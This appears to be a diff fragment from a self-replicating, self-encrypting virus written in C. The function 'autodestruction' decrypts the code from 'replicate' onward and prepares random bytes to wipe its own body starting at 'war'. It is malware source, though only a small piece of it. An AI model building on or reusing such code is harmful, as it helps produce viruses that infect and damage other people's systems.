@@ -6,13 +6,13 @@
 
 void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
+	decrypt_left(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
 
 	char *entry;
-	const size_t size = (void *)autodestruction - (void *)init;
+	const size_t size = (void *)autodestruction - (void *)war;
 	char buf[size];
 
-	entry = (char *)init;
+	entry = (char *)war;
 
 	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
 		_bzero(buf, size);
